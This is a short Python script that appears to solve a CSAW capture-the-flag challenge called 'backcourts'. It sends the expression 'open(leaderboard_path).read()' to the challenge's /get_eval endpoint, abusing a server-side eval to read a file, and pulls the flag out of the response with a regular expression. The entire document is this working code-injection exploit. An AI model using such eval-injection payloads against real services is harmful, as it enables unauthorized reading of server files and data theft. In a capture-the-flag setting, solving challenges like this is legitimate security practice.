#!/usr/bin/env python3
import re
import requests

json = {'expr': 'open(leaderboard_path).read()'}
response = requests.post('https://backcourts.ctf.csaw.io/get_eval', json=json)

print(re.search('csawctf{[^}]+}', response.text).group(0))
